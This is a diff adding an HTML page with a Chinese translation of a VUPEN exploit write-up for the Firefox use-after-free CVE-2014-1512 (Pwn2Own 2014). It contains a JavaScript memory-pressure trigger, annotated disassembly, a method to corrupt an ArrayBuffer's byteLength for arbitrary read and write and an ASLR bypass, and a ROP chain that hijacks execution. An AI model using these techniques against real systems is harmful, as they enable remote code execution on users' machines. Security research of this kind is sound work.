@@ -1,0 +1,180 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Firefox内存释放重用漏洞高级利用(Pwn2Own2014、CVE-2014-1512)</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>Firefox内存释放重用漏洞高级利用(Pwn2Own2014、CVE-2014-1512)</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=200281535&amp;idx=3&amp;sn=20fae644a158504ebeb39fb5ca098c67&amp;chksm=28eb9f341f9c16224408808d16ba6b22ff85bb96b10e6ea699df0a1f094e19fff6f160d87e45&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=200281535&amp;idx=3&amp;sn=20fae644a158504ebeb39fb5ca098c67&amp;chksm=28eb9f341f9c16224408808d16ba6b22ff85bb96b10e6ea699df0a1f094e19fff6f160d87e45&amp;scene=27#wechat_redirect</a></blockquote><p style=""><strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(0, 176, 80);">大家好,Pwn2Own 2014是令人兴奋的并且今年我们要挑战的所有主流浏览器和操作系统比以往任何时候更安全。然而，安全并不是意味着牢不可破，它意味着需要付出更多的努力来查找漏洞并且成功利用漏洞。</span></strong></p><p style=""><br/></p><p style="">今年的Pwn2Own，我们使用了总数为11个的零日不同的零日漏洞来测试Mozilla Firefox、 Internet Explorer 11、Google Chrome、Adobe Reader XI、Adobe Flash、Windows 8.1它们的安全性。我们已经报道了所有的安全漏洞以及向受影响的厂商提交了我们的全部利用促使他们修复这些问题来保护用户。</p><p style=""><br/></p><p style="">在Pwn2Own大会期间我们发现了Mozilla Firefox (MFSA2014-30 / CVE-2014-1512)中的一个内存释放重用安全漏洞，这个缺陷非常不容易被发现和利用，因为它要求浏览器指定脆弱代码分支的内存为特定的内存状态。这种状态被Mozilla称之为：memory-pressure</p><p style=""><strong style="margin: 0px; padding: 0px;"><br/></strong></p><p style=""><strong style="margin: 0px; padding: 0px;">1.漏洞技术分析</strong></p><p style=""><br/></p><p style="">下面的代码在Windows 8.1 (64bit)平台上Firefox v27浏览器中可以满足这个内存释放重用条件。</p><p style=""><br/></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);">&lt;html&gt; &lt;script&gt; var tab = new Array(100000); var counter = 0; function spray() {     for(var i = 0; i&lt;0x100 ; i++){ 
+           tab[counter] = new ArrayBuffer(0x10000); 
+           counter += 1;     } } function Pressure() {     try {spray();} catch (e) {}     for(var i = 0; i&lt;0x4000 ; i++)           counter.toString();     Pressure(); }Pressure(); &lt;/script&gt; &lt;/html&gt;</pre><p style=""><strong style="margin: 0px; padding: 0px;"><br/></strong></p><p style=""><strong style="margin: 0px; padding: 0px;">当页面被装载的时候，Pressure()函数执行了三个任务：</strong></p><p style=""><br/></p><p style="">首先，spray()函数被用于喷射内存；接着，for循环来消耗更多的内存资源；最后，Pressure()函数通过递归调用自己来消耗掉更多的资源。由于Pressure()函数是一个递归函数，spray()函数将被多次调用；每次这个函数执行的堆栈喷射操作的结果被保存到tab数组。在几秒钟之后，Firefox将会出现内存不足，并且Firefox进入特定的内存状态名称为memory pressure以及low memory的环境，它将会自动激活强化内存使用来保护浏览器。</p><p style=""><br/></p><p style="">这里的代码来确定这种状态是否激活： </p><p style=""><br/></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);"> // In "CheckMemAvailable()"  / xul.dll
+ 0x10AF2E5D mov eax, sLowCommitSpaceThreshold // 0x80
+ 0x10AF2E62 xor ecx, ecx
+ 0x10AF2E64 shl eax, 14h // eax = 0x08000000
+ [...]
+ 0x10AF2E6E cmp dword ptr [ebp+stat.ullAvailPageFile], eax // left memory (in bytes)
+ 0x10AF2E71 jnb short loc_10AF2E83
+ 0x10AF2E73 call MaybeScheduleMemoryPressureEvent()//Enable The"memory-pressure" state</pre><p style=""><br/></p><p style="">如果内存小于0×08000000 字节，memory-pressure状态将被自动激活。当firefox进入这种状态模式的时候，将会创建BumpChunk对象的构造函数：</p><p style=""><br/></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);">// In "js::detail::BumpChunk * js::LifoAlloc::getOrCreateChunk()" / mozjs.dll
+ 0x00BFEF3E push edi ; Size
+ 0x00BFEF3F call ds:__imp__malloc
+ 0x00BFEF45 add esp, 4
+ 0x00BFEF48 test eax, eax
+ 0x00BFEF4A jz loc_BFEFFB
+ [...]</pre><p style=""><br/></p><p style="">这个对象的大小是0×2000字节，接着对象的释放是由js::LifoAlloc::freeAll()完成：</p><p style=""><br/></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);">// In "js::LifoAlloc::freeAll()" / mozjs.dll
+ 0x00CD5AF5 mov eax, [this]
+ 0x00CD5AF7 mov ecx, [eax+8]
+ 0x00CD5AFA mov [this], ecx
+ 0x00CD5AFC mov ecx, eax
+ 0x00CD5AFE sub ecx, [eax+4]
+ 0x00CD5B01 push eax// eax points to the "BumpChunk" object
+ 0x00CD5B02 add [this+14h], ecx
+ 0x00CD5B05 call ds:__imp__free                        // free() function
+ 0x00CD5B0B pop ecx
+ 0x00CD5B0C
+ 0x00CD5B0C loc_CD5B0C: 
+ 0x00CD5B0C cmp [this], edi
+ 0x00CD5B0E jnz short loc_CD5AF5</pre><p style=""><br/></p><p style="">在这里，对象将被删除；然而，已经被释放对象的一个引用仍然保留在内存中;这个引用被firefox在几个函数重复使用，如下：</p><p style=""><br/></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);">// In "js::GCMarker::processMarkStackTop()" / mozjs.dll [...]
+ 0x00C07AC3 mov ecx, [edi+14h]// retrieve the ref to the freed object
+ [...]
+ 0x00C07AD8 mov ecx, [ecx]// read into the freed object
+ [...]
+ 0x00C07ADF mov edx, ecx
+ 0x00C07AE1 shr edx, 3
+ 0x00C07AE4 mov [esp+44h+obj], ecx
+ 0x00C07AE8 and edx, 1FFFFh
+ 0x00C07AEE mov ecx, edx
+ 0x00C07AF0 and ecx, 1Fh
+ 0x00C07AF3 mov eax, 1
+ 0x00C07AF8 shl eax, cl
+ 0x00C07AFA mov ecx, [esp+44h+obj]
+ 0x00C07AFE and ecx, 0FFFFC0B0h
+ 0x00C07B04 or ecx, 0FC0B0h
+ 0x00C07B0A shr edx, 5
+ 0x00C07B0D lea edx, [ecx+edx*4]
+ 0x00C07B10 mov ecx, [edx]                                // a crash occurs here!</pre><p style=""><br/></p><p style="">这导致firefox的js::GCMarker::processMarkStackTop()函数存在一个可利用的崩溃。</p><p style=""><strong style="margin: 0px; padding: 0px;"><br/></strong></p><p style=""><strong style="margin: 0px; padding: 0px;">2.Windows8.1(64位)平台开发利用</strong></p><p style=""><br/></p><p style="">为了成功利用这个漏洞，攻击者首先需要控制一个释放对象；然后替换释放对象的数据为攻击者特制的数据。存在漏洞的对象必须创建多个具有相同大小的元素，这个喷射可以由ArrayBuffers of 0×2000 bytes来实现。</p><p style=""><br/></p><p style="">之后对象被释放和改变的时候，它将被几个函数多次使用，其中包括js::GCMarker::processMarkStackTop()" and "js::types::TypeObject::sweep()。js::GCMarker::processMarkStackTop()函数将利用内存泄漏来绕过ASLR，然后js::types::TypeObject::sweep()函数将重新获得并控制到一个新的代码执行流程，我们在Windows8.1弹出一个计算器作为演示。</p><p style=""><strong style="margin: 0px; padding: 0px;"><br/></strong></p><p style=""><strong style="margin: 0px; padding: 0px;">2.1 js::GCMarker::processMarkStackTop()的内存泄漏：</strong></p><p style=""><br/></p><p style="">如前面所讨论的，已经被释放的对象在js::GCMarker::processMarkStackTop()函数中被重新使用：</p><p style=""><br/></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);">// In "js::GCMarker::processMarkStackTop()" / mozjs.dll
+ 0x00C07AC3 mov ecx, [edi+14h]   // retrieve the ref to the freed object
+ // this ref does not point to the beginning of the ArrayBuffer,
+ // but points into the controlled values of the ArrayBuffer
+ [...]
+ 0x00C07AD8 mov ecx, [ecx]          // [ecx] is fully controlled</pre><p style=""><br/></p><p style="">一旦ECX被完全控制，firefox将通过对该值进行各种运算来获得其他两个值。</p><p style=""><br/></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);">// The two values are named: value_1 and value_2
+ 0x00C07ADF mov edx, ecx
+ 0x00C07AE1 shr edx, 3
+ 0x00C07AE4 mov [esp+44h+obj], ecx
+ 0x00C07AE8 and edx, 1FFFFh
+ 0x00C07AEE mov ecx, edx
+ 0x00C07AF0 and ecx, 1Fh
+ 0x00C07AF3 mov eax, 1
+ 0x00C07AF8 shl eax, cl                     // value_1 is obtained here
+ 0x00C07AFA mov ecx, [esp+44h+obj]
+ 0x00C07AFE and ecx, 0FFFFC0B0h
+ 0x00C07B04 or ecx, 0FC0B0h
+ 0x00C07B0A shr edx, 5
+ 0x00C07B0D lea edx, [ecx+edx*4]   // value_2 is obtained here
+ //eax contains value_1
+ //edx contains value_2</pre><p style=""><br/></p><p style="">下面是上面计算过程的一个伪代码参考：</p><p style=""><br/></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);">ecx = fully controlled value
+value_1 = 1 &lt;&lt; ( ( ecx &gt;&gt; 3 ) &amp; 0x0000001F )
+value_2 = ((ecx &amp; 0xFFFFC0B0) | 0xFC0B0 ) + ((( ecx &gt;&gt; 3 ) &amp; 0x1FFFF ) &gt;&gt; 5 ) * 4</pre><p style=""><br/></p><p style="">正如我们所见，这两个值只能在函数内部被控制；计算之后，这两个值在下面的代码中被使用：</p><p style=""><br/></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);">// eax = value_1
+// edx = value_2
+ 0x00C07B10 mov ecx, [edx] 
+ 0x00C07B12 test eax, ecx
+ 0x00C07B14 jz loc_D647C5                // can be controlled
+ [...]
+ 0x00D647C5 loc_D647C5: 
+ 0x00D647C5 or ecx, eax 
+ 0x00D647C7 mov eax, [esp+44h+obj] 
+ 0x00D647CB push ebp 
+ 0x00D647CC mov [edx], ecx             // memory corruption</pre><p style=""><br/></p><p style="">事实上value_2是对应到一个地址；如果跳转0x00C07B14成立，这个地址可能是一个损坏的内存地址；像这样的内存地址有几种方法来执行内存泄漏，下面就是其中之一：</p><p style=""><br/></p><p style="">第一，ArrayBuffers喷射被使用，并且设置它的喷射值为一个可预测的地址；然后被损坏的内存可以来损坏ArrayBuffer的内存，特别是byteLength域。下面是一个ArrayBuffer的范例内存布局。</p><p><br/></p><p><img data-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38FWooXDssj4u7fDdFibMx5myZKrwYaNZzibDyORNCJTV0U8oReqGsuCfLXGnz58H8roSBYtM7iayNmw/0" style="float:none;" src="../Images/70f9d6566fa70a0e823688c269edd513.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38FWooXDssj4u7fDdFibMx5myZKrwYaNZzibDyORNCJTV0U8oReqGsuCfLXGnz58H8roSBYtM7iayNmw/0"/></p><p><br/></p><p style="">当视图ArrayBuffer被创建的byteLength被选中的时候，视图ArrayBuffer的内容将允许可读可写。这里是一个视图被创建的函数原型：</p><p style=""><br/></p><p style="">view Int32Array(ArrayBuffer buffer, unsigned long byteOffset, unsigned long length);</p><p style=""><br/></p><table width="428" style="width: 347px;"><tbody style="margin: 0px; padding: 0px;"><tr style="margin: 0px; padding: 0px;"><td width="94" valign="top" style="margin: 0px; padding: 0px; word-break: break-all;"><p class="p0" style="padding-top: 6px; padding-bottom: 4px; overflow: hidden; word-wrap: break-word;">Attribute</p></td><td width="102" valign="top" style="margin: 0px; padding: 0px;"><p class="p0" style="padding-top: 6px; padding-bottom: 4px; overflow: hidden; word-wrap: break-word;">Type</p></td><td width="375" valign="top" style="margin: 0px; padding: 0px;"><p class="p0" style="padding-top: 6px; padding-bottom: 4px; overflow: hidden; word-wrap: break-word;">Description</p></td></tr><tr style="margin: 0px; padding: 0px;"><td width="70" valign="top" style="margin: 0px; padding: 0pt 5.4pt;"><p class="p0" style="margin-top: 0pt; margin-bottom: 0pt; padding-top: 6px; padding-bottom: 4px; overflow: hidden; word-wrap: break-word; text-align: justify;">buffer</p></td><td width="76" valign="top" style="margin: 0px; padding: 0pt 5.4pt;"><p class="p0" style="margin-top: 0pt; margin-bottom: 0pt; padding-top: 6px; padding-bottom: 4px; overflow: hidden; word-wrap: break-word; text-align: justify;">ArrayBuffer</p></td><td width="281" valign="top" style="margin: 0px; padding: 0pt 5.4pt;"><p class="p0" style="margin-top: 0pt; margin-bottom: 0pt; padding-top: 6px; padding-bottom: 4px; overflow: hidden; word-wrap: break-word; text-align: justify;">The ArrayBuffer object used to contain the TypedArray data. Read only.</p></td></tr><tr style="margin: 0px; padding: 0px;"><td width="70" valign="top" style="margin: 0px; padding: 0pt 5.4pt;"><p class="p0" style="margin-top: 0pt; margin-bottom: 0pt; padding-top: 6px; padding-bottom: 4px; overflow: hidden; word-wrap: break-word; text-align: justify;">byteOffset</p></td><td width="76" valign="top" style="margin: 0px; padding: 0pt 5.4pt;"><p class="p0" style="margin-top: 0pt; margin-bottom: 0pt; padding-top: 6px; padding-bottom: 4px; overflow: hidden; word-wrap: break-word; text-align: justify;">unsigned long</p></td><td width="281" valign="top" style="margin: 0px; padding: 0pt 5.4pt;"><p class="p0" style="margin-top: 0pt; margin-bottom: 0pt; padding-top: 6px; padding-bottom: 4px; overflow: hidden; word-wrap: break-word; text-align: justify;">The index at which the TypedArray starts within the underlying ArrayBuffer. Read only.</p></td></tr><tr style="margin: 0px; padding: 0px;"><td width="70" valign="top" style="margin: 0px; padding: 0pt 5.4pt;"><p class="p0" style="margin-top: 0pt; margin-bottom: 0pt; padding-top: 6px; padding-bottom: 4px; overflow: hidden; word-wrap: break-word; text-align: justify;">lengthInt</p></td><td width="76" valign="top" style="margin: 0px; padding: 0pt 5.4pt;"><p class="p0" style="margin-top: 0pt; margin-bottom: 0pt; padding-top: 6px; padding-bottom: 4px; overflow: hidden; word-wrap: break-word; text-align: justify;">unsigned long</p></td><td width="281" valign="top" style="margin: 0px; padding: 0pt 5.4pt;"><p class="p0" style="margin-top: 0pt; margin-bottom: 0pt; padding-top: 6px; padding-bottom: 4px; overflow: hidden; word-wrap: break-word; text-align: justify;">The number of entries in the array. Read only.</p></td></tr></tbody></table><p style=""><br/></p><p style="">The size of an entry is always 4 bytes.</p><p style=""><br/></p><p style="">ArrayBuffer's 的"byteLength" 域与Int32Array()函数的参数比较：</p><p style=""><br/></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);">if( (ArrayBuffer's "length") &gt;= (byteOffset arg) + (length arg) * 4 ){
+        [...]  // will create the view
+ }else{
+        error();
+ }</pre><p style=""><br/></p><p style="">这里是比较过程的汇编代码：</p><p style=""><br/></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);">// In "namespace___TypedArrayObjectTemplate_int___fromBuffer()" / mozjs.dll
+ // ecx points to start of ArrayBuffer&amp;#039;s payload area
+ 0x00E4873F mov edx, [eax-0Ch]          // retrieve the "byteLength" field 
+ [...]
+ 0x00E4874B mov eax, [ebp+lengthInt] // retrieve the 3rd arg of "Int32Array"
+ [...]
+ 0x00E48769 mov ecx, eax
+ 0x00E4876B shl ecx, 2
+ [...]
+ 0x00E48780 add ecx, ebx                    // ebx, 2nd argument of "Int32Array"
+ 0x00E48782 cmp ecx, edx
+ 0x00E48784 ja short loc_E48799// If the jump is taken, the view will not be created</pre><p style=""><br/></p><p style="">ArrayBuffer的 byteLength字段允许攻击者通过创建一个视图来控制它到足够大，这个长度是非常大的，并且允许读取或者写入ArrayBuffer。</p><p style=""><br/></p><p style="">与之前讨论的一样，value_2只能在函数内部被控制，所以ArrayBuffer的byteLength字段也只能在函数局部被控制；然而，内存损坏可以允许我们为byteLength字段增加0×01000000字节，从而导致可以对下一个被创建视图的内存进行读写。在第二次的时候ArrayBuffer的byteLength将被完全控制。</p><p style=""><br/></p><p style="">我们第二次可以创建一个视图通过设置ArrayBuffer的byteLength为0xFFFFFFFF，从而读取或者写入用户空间的任意内存位置。</p><p style=""><br/></p><p style="">在这点之上向前一步，我们的目标是获得DLL的装载基址。现在我们可以通过读取ArrayBuffer的标志头第三个dword来实现获得mozjs.dll的地址。这里是ArrayBuffer视图的内存布局：</p><p><br/></p><p><img data-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38FWooXDssj4u7fDdFibMx5mjFxlC8a0QtmyGRj8uID1iaLPV9xGAsicJia7Cic0ibfPOfsoiaV4LA9oowmw/0" style="float:none;" src="../Images/4f2c660f58f2eb2e7ba30d3306533910.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38FWooXDssj4u7fDdFibMx5mjFxlC8a0QtmyGRj8uID1iaLPV9xGAsicJia7Cic0ibfPOfsoiaV4LA9oowmw/0"/></p><p><br/></p><p style="">这里是第三个dword和mozjs.dll模块的关系：</p><p style=""><br/></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);"> CPU Stack
+ Address Value 
+ 0x0A18FF10 0x049A0928 
+ [...]
+ 0x049A0928 0x049A2600
+ [...]
+ 0x049A2600 0x00E8D4D8 
+ [...]
+ 0x00E8D4D8 0x00E9AFE4 ; ASCII "Int32Array"</pre><p style=""><br/></p><p style="">地址0x00E9AFE4属于mozjs.dll模块，它允许我们通过泄漏的地址建立一个ROP来绕过ASLR/DEP。</p><p style=""><strong style="margin: 0px; padding: 0px;"><br/></strong></p><p style=""><strong style="margin: 0px; padding: 0px;">2.2  js::types::TypeObject::sweep()控制EIP：</strong></p><p style=""><br/></p><p style="">现在该内存泄漏已经实现，当释放对象在js::types::TypeObject::sweep()函数中被重用的时候，我们必须找到一种办法来控制执行流程，这可以由下面这个过程完成：</p><p style=""><br/></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);">// In "js::types::TypeObject::sweep()" / mozjs.dll
+ 0x00C7F567 mov ecx, [eax]                     // ecx is fully controlled [...]
+ 0x00C7F577 mov [esp+38h+var_10], ecx
+ [...]
+ 0x00C7F5CD lea eax, [esp+38h+var_10]
+ 0x00C7F5D1 call js::EncapsulatedId::pre(void)
+ // In "js::EncapsulatedId::pre()"
+ 0x00C7FBA0 push ecx
+ 0x00C7FBA1 mov eax, [eax]                   // controlled
+ 0x00C7FBA3 mov ecx, ecx
+ [...]
+ 0x00C7FBB8 and eax, 0FFFFF000h
+ 0x00C7FBBD mov eax, [eax]                  // controlled
+ 0x00C7FBBF cmp byte ptr [eax+8], 0
+ 0x00C7FBC3 jnz loc_D3F5C4                  // jump must be taken
+ 0x00C7FBC9
+ [...]
+ 0x00D3F5C4 loc_D3F5C4: 
+ 0x00D3F5C4 mov edx, [eax+4]              // controlled
+ 0x00D3F5C7 push offset aWriteBarrier 
+ 0x00D3F5CC lea ecx, [esp+8+str]
+ 0x00D3F5D0 push ecx 
+ 0x00D3F5D1 push edx                           // 1st arg
+ 0x00D3F5D2 call js::gc::MarkStringUnbarriered()
+ // In "js::gc::MarkStringUnbarriered()"
+ 0x00C55FD0 mov ecx, [esp+name] 
+ 0x00C55FD4 mov edx, [esp+thingp] 
+ 0x00C55FD8 mov eax, [esp+trc]            // retrieve 1st arg
+ [...]
+ 0x00C55FF0 push eax                           // set 1st arg for MarkInternal_JSString_()
+ 0x00C55FF1 mov dword ptr [eax+8], 0
+ 0x00C55FF8 mov [eax+0Ch], name
+ 0x00C55FFB mov [eax+10h], 0FFFFFFFFh
+ 0x00C56002 call MarkInternal_JSString_()</pre><p style=""><br/></p><p style="">接着，在MarkInternal_JSString_()函数可能可以重新获得控制流程：</p><p style=""><br/></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);">// In "MarkInternal_JSString_()"
+ 0x00C3ABA2 mov ebp, [esp+8+trc]      // retrieve 1st arg
+ 0x00C3ABA6 mov ecx, [ebp+4]            // controlled
+ 0x00C3ABA9 xor ebx, ebx
+ 0x00C3ABAB push esi
+ 0x00C3ABAC push edi
+ 0x00C3ABAD cmp ecx, ebx
+ 0x00C3ABAF jnz loc_C3AC9C               // controlled, we take this jump
+ [...]
+ 0x00C3AC9C loc_C3AC9C: 
+ 0x00C3AC9C push 1
+ 0x00C3AC9E push thingp
+ 0x00C3AC9F push ebp
+ 0x00C3ACA0 call ecx                           // redirect EIP here, pwnd!</pre><p style=""><br/></p><p style="">我们可以从上面看到；如果ECX设置为null，代码路线将引导流程来重新控制EIP；当泄漏操作为完成的时候，[ebp+4]需要设置为null来避免控制EIP从而引发浏览器崩溃。当泄漏操作完成的时候， [ebp+4]的值将被设置为一个包含地址的可执行内存(有问题？)。然后通过mozjs.dll来建立ROP从而完成利用开发：</p><p style=""><br/></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);"> // Make eax point to another location (in the spray)
+ 0x00D997C3 mov eax, [eax+588h]
+ 0x00D997C9 mov edx, [eax]                // controlled
+ 0x00D997CB mov ecx, eax
+ 0x00D997CD call dword ptr [edx]         // call the 2nd gadget 
+ // Set a controlled value on the stack
+ 0x00CD9855 push [ebp-80h]               // controlled, address of the 4th gadget
+ 0x00CD9858 mov ecx, state
+ 0x00CD985A call dword ptr [eax+4]    // call the 3rd gadget
+ // Make esp point to a controlled location
+ 0x00D2906A pop ecx
+ 0x00D2906B xchg eax, esp
+ 0x00D2906C mov eax, [eax]              // address of the 4th gadget 
+ 0x00D2906E mov [esp], eax
+ 0x00D29071 retn                               // return to the 4th gadget
+ // Adjust the stack and enjoy
+ 0x00BD062D add esp, 10h
+ 0x00BD0630 retn/ will return to "VirtualProtect()" after
+// the stack has been properly crafted</pre><p style=""><br/></p><p style="">这里就引出了在Windows8.1上面可以绕过ASLR/DEP从而执行任意代码；它也可以绕过EMET，但是这作为练习题来留给本文读者。</p><p style=""><br/></p><p style="">[via vupen]</p><p><br/></p><p><img data-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38FWooXDssj4u7fDdFibMx5mwsCOwicPbn1EtQvNx6cSicpuG52xgDfuTR84yXPvvJprVXpGvbRfV0DA/0" src="../Images/3d03239ae5136757cf40dee27354e65c.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38FWooXDssj4u7fDdFibMx5mwsCOwicPbn1EtQvNx6cSicpuG52xgDfuTR84yXPvvJprVXpGvbRfV0DA/0"/></p>
+        
+</body>
+</html>
